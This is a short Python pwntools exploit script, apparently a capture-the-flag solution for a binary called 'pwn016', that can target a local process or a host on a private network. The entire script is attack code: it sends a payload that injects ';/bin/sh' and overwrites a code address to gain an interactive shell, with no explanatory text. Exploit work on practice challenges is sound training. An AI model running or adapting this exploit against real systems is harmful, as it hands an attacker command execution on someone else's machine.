#!/usr/bin/env python
from pwn import *
import sys

HOST = '192.168.20.234'
PORT = 31082

def info(s):
	log.info(s)

def exploit(p):
	p.sendline('1')
	payload='a;/bin/sh\x00'+p32(0x08048460)+p32(0x08048460)
	p.sendline(payload)
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./pwn016')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
